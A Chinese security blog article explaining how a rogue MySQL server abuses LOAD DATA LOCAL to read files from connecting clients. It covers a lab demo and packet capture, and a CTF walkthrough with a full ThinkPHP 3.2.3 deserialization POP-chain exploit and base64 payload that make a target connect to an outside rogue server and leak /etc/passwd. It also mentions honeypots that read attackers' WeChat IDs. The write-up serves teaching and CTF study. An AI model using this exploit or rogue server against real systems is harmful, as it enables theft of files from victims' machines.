> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/pl4ngoFUVZJ3U0EXGN4NGQ)

* * *

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZDj8o7aeiaqiaEkMibY3UicrNtvCDcLYiawjQ1Sia2n2PvjmbiaEDoJya5Ygdw/640?wx_fmt=jpeg)  
**前言**

*   LOAD DATA INFILE
    
*   漏洞原理
    
*   漏洞演示
    
*   抓包分析
    
*   实战中的利用
    

*   读取敏感信息
    
*   制作 MySQL 蜜罐
    

*   Ending.....
    

前言
--

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZR3gPpTuhh3f4jUspQDEeoicxtdqPDCfuiaBdvvXltWO4ciaV6jHvwzjicA/640?wx_fmt=png)

在昨天（2021 年 4 月 11 号），云舒大佬发了一个微博，疑似有人在在 Freebuf 上发了一篇带有蜜罐的文章，代码里面有 MySQL 帐号和密码。经云舒大佬连接测试后，发现这个 MySQL 服务器会读取连接它的客户端上的文件。

其实这个蜜罐利用的原理是一个很有趣的 trick，原理在于 MySQL 服务端可以利用 `LOAD DATA LOCAL` 命令来读取 MYSQL 客户端的任意文件。这应该是一个很早以前就爆出来的漏洞，当年 TCTF2018 final 线下赛的比赛中，Dragon Sector 和 Cykor 就是用这个漏洞来非预期了 h4x0r's club 这道题。

LOAD DATA INFILE
----------------

`LOAD DATA INFILE` 语句用于高速地从一个文本文件中读取行，并写入一个表中。文件名称必须为一个文字字符串。

`LOAD DATA INFILE` 是 `SELECT ... INTO OUTFILE` 的相对语句。把表的数据备份到文件使用`SELECT ... INTO OUTFILE`，从备份文件恢复表数据，使用 `LOAD DATA INFILE`。

标准示例：

```
load data infile "/data/data.csv" into table TestTable;
load data local infile "/data/test.csv" into table TestTable;
```

第一行是读取服务端本地的文件，第二行是读取客户端本地的文件。

如下所示，我们读取客户端本地的 data.csv 文件到服务端数据库的 TestTable 表中：

```
load data local infile "/tmp/data.csv" into table TestTable FIELDS TERMINATED BY ',';
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZnB6unsauHWC1x22n5Z8FkzAIq7ylur4Q6WzNkOyqwN1STzHCefU19Q/640?wx_fmt=png)image-20210412104457432

除了 csv 文件，我们还可以读取任意格式的文件到表中：

```
load data local infile "/etc/passwd" into table TestTable FIELDS TERMINATED BY '\n';
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZBhjH2ib0QbQ5GyhCaLLcX8wUdAXKIjHr3xj4GYs9LYVe0HtIBMrbJQw/640?wx_fmt=png)image-20210412104742862

如上图所示，我们成功将客户端上的 / etc/passwd 文件读取到了服务端 MySQL 的数据表中。很显然，`LOAD DATA INFILE` 这个语句是不安全的，在 MySQL 的官方文档里也充分说明了这一点：https://dev.mysql.com/doc/mysql-security-excerpt/5.7/en/load-data-local-security.html

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZSFREMRDVibiaIjG4Aaukp2eGHKPicoGWfaJffFfLVYj90oWIF2kG6YgBg/640?wx_fmt=png)image-20210412105237777

其大致意思如下：

*   因为 `LOAD DATA LOCAL` 是 SQL 语句，其执行是在服务器端进行的，并且文件从客户端主机到服务器主机的传输是由 MySQL 服务器启动的，MySQL 服务端将告诉客户端该语句中命名的文件。从理论上讲，打补丁的服务器可以告诉客户端程序传输服务器选择的任何文件，而不是语句中命名的文件。这样的服务器可以访问客户端用户具有读取权限的客户端主机上的任何文件。
    

下面，我们就围绕这个点所产生的漏洞进行详细的分析。

漏洞原理
----

该漏洞的核心原理在于 MySQL 服务端可以利用 `LOAD DATA LOCAL` 命令来读取 MYSQL 客户端的任意文件。

MySQL 客户端和服务端在通信过程中是通过对话的形式来实现的，客户端发送一个操作请求，然后服务端根据客服端发送的请求来响应客户端。在这个过程中，如果客户端的一个操作需要两步请求才能完成，那么当它发送完第一个请求过后并不会存储这个请求，而是直接就丢掉了，所以第二步就是根据服务端的响应来继续进行，这里服务端就可以欺骗客户端做一些其他的事情。

但是一般的 MySQL 客户端和服务端通信都是客服端发送一个 MySQL 语句然后服务端根据这条语句查询后返回结果，没有什么可以利用的。不过我们前面说了，MySQL 有个 `LOAD DATA INFILE` 命令，可以读取一个文件内容并插入到表中。

如下，当 MySQL 客户端以下执行 `LOAD DATA INFILE` 命令后：

```
load data local infile "/data/test.csv" into table TestTable;
```

MySQL 客户端与服务端的交互可以表示为一下对话：

1.  客户端：把我我本地 / data/test.csv 的内容插入到 TestTable 表中去
    
2.  服务端：请把你本地 / data/test.csv 的内容发送给我
    
3.  客户端：好的，这是我本地 / data/test.csv 的内容：....
    
4.  服务端：成功 / 失败
    

正常情况下这个流程是没毛病的，但是前面我说了客户端在第二次并不知道它自己前面发送了什么给服务器，所以客户端第二次要发送什么文件完全取决于服务端，如果这个服务端不正常，就有可能发生如下对话：

1.  客户端：把我我本地 / data/test.csv 的内容插入到 TestTable 表中去
    
2.  服务端：请把你本地 / etc/passwd 的内容发送给我
    
3.  客户端：好的，这是我本地 / etc/passwd 的内容：....
    
4.  服务端：.... 随意了
    

这样服务端就非法拿到了 `/etc/passwd` 的文件内容。今天我要实现的就是做一个伪服务端来欺骗善良的客户端获得客户端主机上任意文件的过程。

MySQL 官方文档中有一句话是这样说的：

> "A patched server could in fact reply with a file-transfer request to any statement, not just LOAD DATA LOCAL"

意思就是，伪造的服务端可以在任何时候回复一个 file-transfer 请求进行客户端与服务端之间的文件传输，不一定非要是在 `LOAD DATA LOCAL` 的时候。

总结一下漏洞的成因：

1.  `LOAD DATA INFILE` 读哪个文件是由服务端返回包的 file-transfer 请求决定，而不是客户端。
    
2.  不管客户端发出什么请求，只要服务端回复一个 file-transfer 请求，客户端就会按照`LOAD DATA INFILE`的流程读取文件内容发给服务端
    

总结一下整个攻击流程：

1.  受害者向攻击者提供的服务器发起请求，并尝试进行身份认证
    
2.  攻击者的 MySQL 接受到受害者的连接请求，攻击者发送正常的问候、身份验证正确，并且向受害者的 MySQL 客户端请求文件。
    
3.  受害者的 MySQL 客户端认为身份验证正确，执行攻击者的发来的请求，通过 `LOAD DATA INLINE` 功能将文件内容发送回攻击者的 MySQL 服务器。
    
4.  攻击者收到受害者服务器上的信息，读取文件成功，攻击完成。
    

漏洞演示
----

一些 Mysql 客户端，比如 Python 的 MySQLdb 和 mysqlclient，PHP 的 mysqli 和 PDO，Java 的 JDBC Driver 以及原生 MySQL 客户端等，在连接 MySQL 的时候，基本上在连接成功之后都会发出一些 SELECT 语句来查询一些版本号、编码之类的数据，这时就可以回复一个 file-transfer 请求来利用该漏洞，读取客户端上的文件。

这里有一点要说明的是，如果想要利用此特性，客户端必须具有 `CLIENT_LOCAL_FILES` 属性，所以可能要在连接服务端的时候添加 `--enable-local-infile` 选项。

以下是本次实验的测试环境。

攻击机（服务端）：

*   Kali Linux
    
*   192.168.43.247
    

受害机（客户端）：

*   Ubuntu
    
*   192.168.43.82
    

首先下载大佬写好的 POC 脚本 Rogue-MySql-Server，找到 rogue_mysql_server.py 脚本的第 26 行处的元组 `filelist`：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZ5gQIwIykqaQuhUCCwPVEQkrbzA11hk3PicPibias1pMbfga1jPibVMvib0g/640?wx_fmt=png)image-20210407163934141

元组 `filelist`里面为要读取的受害者主机上的文件地址（读 Windows 文件时注意路径）。

然后在攻击机（服务端）上执行 rogue_mysql_server.py 脚本：

```
python rogue_mysql_server.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZJicC2QQJfeVrOfY9xjlsH4Pp4cibeSSxd21ojyOOrk69O2iaDibIvOV9zA/640?wx_fmt=png)image-20210407164158653

然后，我们控制受害机（客户端）连接我们当才在攻击机上搭建的恶意服务端：

```
mysql -h192.168.43.247 -uroot -p --enable-local-infile
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZUGlao7X3vwaC4FonGcstricCtChjvaCUkl1XfbeXKbknVsUfZW2mtIw/640?wx_fmt=png)image-20210407175447854

当客户端连上攻击机搭建的服务端瞬间，服务端便可以读取到受害机客户端上的 / etc/passwd，并记录到 Rogue-MySql-Server 中的日志文件中：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZxg7Iuu5l5dN2QahdYCyia50EkRloiaicxWnrVNTlg9LBYHxEAWAf4Rbzw/640?wx_fmt=png)image-20210407170904219

漏洞利用成功。

抓包分析
----

下面是整个攻击过程的 wireshark 抓包分析。我们在客户端

（1）客户端连接上攻击者伪造的服务端瞬间，服务端会向客户端发送 "Greeting" 数据包，服务端返回的 banner，其中包含 MySQL 的版本等信息：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZ8h4ZGykhddxz6j4jM7PRofUianGNLPOoaSYicjH0AGiaawWs0q6esZEow/640?wx_fmt=png)image-20210412110918522

（2）然后客户端向服务端发送 MySQL 登录请求：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZSMiaE0V5X7VzjPoUx3yg7LxXQKJkxB0ToTxKiaafYPI83ickf3nLHpapQ/640?wx_fmt=png)image-20210412111052854

（3）登录时候，客户端会进行一些 SELECT 初始化查询，一些版本号、编码之类的数据等：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZXjINfLSl49VMF68TDI93qjkib4XwUYFrhYXOpI97v1xyF9TbYIo0DiaQ/640?wx_fmt=png)image-20210412111410500

（4）之后就是执行  `LOAD DATA LOCAL`  语句进行文件传输了：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZqgSb0DPytibartuLvSBpQ4dibTOCcF5qS0TN4FrDLdSCktJCSsQCjZBg/640?wx_fmt=png)image-20210412111832063

从抓到的流量包中我们可以看到，服务端读取了客户端上的 /etc/passwd 文件内容。

实战中的利用
------

### 读取敏感信息

由于部分 CMS 提供通过后台绑定数据库地址，那么可以考虑通过构造恶意服务端利用上述方式获取到一些敏感信息。下面我们通过 [红明谷 CTF 2021]EasyTP 这道 CTF 例题来看一看。

进入题目：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZjpaQ5kTQO1g4GIE0hzd00Aq7TNVcf4RgXx2oWJ91JXSHUibZ0rS3CsQ/640?wx_fmt=png)image-20210407173445324

随便报个错发现是 ThinkPHP 3.2.3，该版本存在反序列化造成的 sql 注入漏洞：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZ6H6coo5HKy0zPicClrjz0ekkSJpYr5MprBnwQcctNjnf1CiargLxVuUg/640?wx_fmt=png)image-20210407173558811

扫描目录发现网站备份文件 www.zip，将源码下载下来查看默认的控制器，发现反序列化点：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZfR4dyU8DNZ3ziaY5YJLKSMEq23ibiax8zXUaJE2UlYnniapvybp6bibLqxA/640?wx_fmt=png)image-20210407174656327

我们可以通过这个反序列化点触发 sql 注入，或者连接我们搭建的恶意的 MySQL 服务端。

首先在自己 vps 上面使用 rogue_mysql_server.py 搭建一个恶意的 MySQL 服务端（如果 MySQL 端口冲突可以换一个端口，这里我改成了 3307 端口）：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZTrBAN88yA947jU6DfaPyb7jR0ib1iawcNNAdYLqhcs7YAotkepTeymhg/640?wx_fmt=png)image-20210407175756657

去网上找个 POP 链然后改改参数直接打就行了：https://f5.pm/go-53579.html

```
<?php
namespace Think\Db\Driver{
    use PDO;
    class Mysql{
        protected $options = array(
            PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
        );
        protected $config = array(
            "debug"    => 1,
            "database" => "thinkphp3",
            "hostname" => "47.xxx.xxx.72",
            "hostport" => "3307",
            "charset"  => "utf8",
            "username" => "root",
            "password" => ""
        );
    }
}

namespace Think\Image\Driver{
    use Think\Session\Driver\Memcache;
    class Imagick{
        private $img;

        public function __construct(){
            $this->img = new Memcache();
        }
    }
}

namespace Think\Session\Driver{
    use Think\Model;
    class Memcache{
        protected $handle;

        public function __construct(){
            $this->handle = new Model();
        }
    }
}

namespace Think{
    use Think\Db\Driver\Mysql;
    class Model{
        protected $options   = array();
        protected $pk;
        protected $data = array();
        protected $db = null;

        public function __construct(){
            $this->db = new Mysql();
            $this->options['where'] = '';
            $this->pk = 'id';
            $this->data[$this->pk] = array(
                "table" => "mysql.user where 1=updatexml(1,user(),1)#",
                "where" => "1=1"
            );
        }
    }
}

namespace {
    echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
}
```

执行 POC 生成 payload：

```
TzoyNjoiVGhpbmtcSW1hZ2VcRHJpdmVyXEltYWdpY2siOjE6e3M6MzE6IgBUaGlua1xJbWFnZVxEcml2ZXJcSW1hZ2ljawBpbWciO086Mjk6IlRoaW5rXFNlc3Npb25cRHJpdmVyXE1lbWNhY2hlIjoxOntzOjk6IgAqAGhhbmRsZSI7TzoxMToiVGhpbmtcTW9kZWwiOjQ6e3M6MTA6IgAqAG9wdGlvbnMiO2E6MTp7czo1OiJ3aGVyZSI7czowOiIiO31zOjU6IgAqAHBrIjtzOjI6ImlkIjtzOjc6IgAqAGRhdGEiO2E6MTp7czoyOiJpZCI7YToyOntzOjU6InRhYmxlIjtzOjQxOiJteXNxbC51c2VyIHdoZXJlIDE9dXBkYXRleG1sKDEsdXNlcigpLDEpIyI7czo1OiJ3aGVyZSI7czozOiIxPTEiO319czo1OiIAKgBkYiI7TzoyMToiVGhpbmtcRGJcRHJpdmVyXE15c3FsIjoyOntzOjEwOiIAKgBvcHRpb25zIjthOjE6e2k6MTAwMTtiOjE7fXM6OToiACoAY29uZmlnIjthOjc6e3M6NToiZGVidWciO2k6MTtzOjg6ImRhdGFiYXNlIjtzOjk6InRoaW5rcGhwMyI7czo4OiJob3N0bmFtZSI7czoxMjoiNDcuMTAxLjU3LjcyIjtzOjg6Imhvc3Rwb3J0IjtzOjQ6IjIzMzMiO3M6NzoiY2hhcnNldCI7czo0OiJ1dGY4IjtzOjg6InVzZXJuYW1lIjtzOjQ6InJvb3QiO3M6ODoicGFzc3dvcmQiO3M6MDoiIjt9fX19fQ==
```

执行。如下图，成功将目标主机上的 /etc/passwd 读取出来：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZw1gD8iaSyERP1hreH57wRwQ1bHiaq0LWFg1iaaloLaqIjl90zS9nH2LtA/640?wx_fmt=png)image-20210407182414600![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZqXaxCggV6r6CrxmsRWFgibSYXx6oLkE8Ao2TsRFGPekJuUyUicqibDYUQ/640?wx_fmt=png)image-20210407182515850

利用成功。

### 制作 MySQL 蜜罐

就像 Freebuf 上那篇文章一样，利用该漏洞制作 MySQL 蜜罐，诱使攻击者去连接，从而读取攻击者主机上的敏感信息。

在 Github 上就有一个 MysqlHoneypot，可以利用 MySQL 蜜罐去读取攻击者的微信 ID。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZToicTliaV7PAR3ztz2RKrW8OVjvaYNtotxsYh1Fjkup49CJXMAKyMujg/640?wx_fmt=png)image-20210412112640639

Ending......
------------

![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibEKhUK3Az5QEk6daGF4eXZMN9KEYSGFDuaSRxm8icCfUZiaW4iar8fpLBVAqpeosY7EVzwXtUkV9ibSQ/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

**推荐阅读：**

**[实战 ｜ 记一次基础的内网 Vulnstack 靶机渗透（一](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494583&idx=1&sn=efc4e9afc9689575f17e57f5967f7ea0&chksm=ec1cbe88db6b379e618f3da0a4fa97658e1f7b024e5fda48296a3136bac55ded3201ce331870&scene=21#wechat_redirect)）  
**

**[记一次](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494593&idx=1&sn=3db21291cd7217c6551b7bc51e8d3bbf&chksm=ec1cbefedb6b37e8bf129a75f29af46862255ddf944fc5067d4dbfcbded5fb33c121c1165fc1&scene=21#wechat_redirect)**[内网 Vulnstack 靶机渗透](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494583&idx=1&sn=efc4e9afc9689575f17e57f5967f7ea0&chksm=ec1cbe88db6b379e618f3da0a4fa97658e1f7b024e5fda48296a3136bac55ded3201ce331870&scene=21#wechat_redirect)**（二）  
**

**[实战 ｜ 记一次 Vulnstack 靶场内网渗透（三）](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494581&idx=1&sn=948d8cb4120b78e1b7cc4094b13f8c6a&chksm=ec1cbe8adb6b379c6f90a39976c9b88c9edb36a061e8478317fac49169b35b7b5f78f2f9c0d7&scene=21#wechat_redirect)  
**

  
**[记一次 Vulnstack 靶场内网渗透（四）](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494722&idx=1&sn=172635be29e6d2eeecc90b0b36c86ef3&chksm=ec1cb97ddb6b306bf2eb3ed17cd0527548a72b67a73c127683977bcf916cd72d34620320eaa3&scene=21#wechat_redirect)**

**[实战记录 ｜ 自主搭建的三层网络域渗透靶场](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494324&idx=1&sn=b037dc2ecca8a8fb2046521839bc64bf&chksm=ec1cbf8bdb6b369de5874b1f3d9c6a8e30d059c1b4cdcc13af8f9bdf78584adb21463bba4413&scene=21#wechat_redirect)**  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibVuhxbHrBQLfbnMFFe9SJT41vUS1XzgC0VZGHjuzp8zia9gbH7HBDmCVia2biaeZhwzMt8ITMbEnGIA/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247494120&idx=2&sn=e659b4f88a4c40442d36d73f8eea9d96&chksm=ec1cbcd7db6b35c1f493151004956b010056cdcc6378d197aade5bd3c559a787d7b28e22e3e9&scene=21#wechat_redirect)

**点赞 在看 转发**  

原创投稿作者：Mr.Anonymous

博客: whoamianony.top

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)